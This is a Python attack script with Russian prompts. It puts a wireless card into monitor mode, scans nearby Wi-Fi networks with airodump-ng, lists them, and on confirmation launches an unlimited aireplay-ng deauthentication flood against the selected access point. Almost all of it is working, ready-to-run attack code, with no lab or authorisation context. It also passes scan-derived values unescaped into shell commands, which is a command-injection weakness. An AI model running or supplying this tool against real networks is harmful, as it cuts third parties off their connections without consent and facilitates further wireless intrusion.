#!/usr/bin/env python3
import os
import time

print("="*50)
print("WiFi SCANNER - ВЫБОР ИЗ СПИСКА")
print("="*50)

# 1. Включаем мониторный режим
os.system("sudo airmon-ng start wlan0")
time.sleep(2)

# 2. Сканируем сети 10 секунд
print("\nСканирую сети...")
os.system("sudo timeout 10 airodump-ng wlan0mon --output-format csv -w /tmp/wifi_scan")

# 3. Читаем результаты
print("\n" + "="*50)
print("НАЙДЕННЫЕ СЕТИ:")
print("="*50)

networks = []
try:
    with open("/tmp/wifi_scan-01.csv", "r") as f:
        lines = f.readlines()
    
    start_parsing = False
    for line in lines:
        if "Station MAC" in line:
            break
            
        if "BSSID" in line and "Channel" in line:
            start_parsing = True
            continue
            
        if start_parsing and line.strip():
            parts = line.split(",")
            if len(parts) >= 14:
                bssid = parts[0].strip()
                channel = parts[3].strip()
                essid = parts[13].strip().strip('"')
                
                if not essid:
                    essid = "[Hidden]"
                
                networks.append((bssid, channel, essid))
                
                # Показываем первые 5 сетей
                if len(networks) <= 5:
                    print(f"[{len(networks)}] {essid}")
                    print(f"    Канал: {channel} | BSSID: {bssid}\n")
except:
    print("Не удалось прочитать файл")

# 4. Выбор сети
if networks:
    try:
        choice = int(input(f"Выбери сеть (1-{min(5, len(networks))}): "))
        if 1 <= choice <= len(networks):
            bssid, channel, essid = networks[choice-1]
            
            print(f"\nВыбрано: {essid}")
            print(f"Канал: {channel}")
            
            # 5. Меняем канал
            os.system(f"sudo iw dev wlan0mon set channel {channel}")
            
            # 6. Deauth
            if input("Deauth атака? (y/n): ").lower() == "y":
                print(f"\nЦель: {essid}")
                os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} wlan0mon")
    except:
        print("Ошибка выбора")

# 7. Восстановление
os.system("sudo airmon-ng stop wlan0mon")
print("\n✅ Готово!")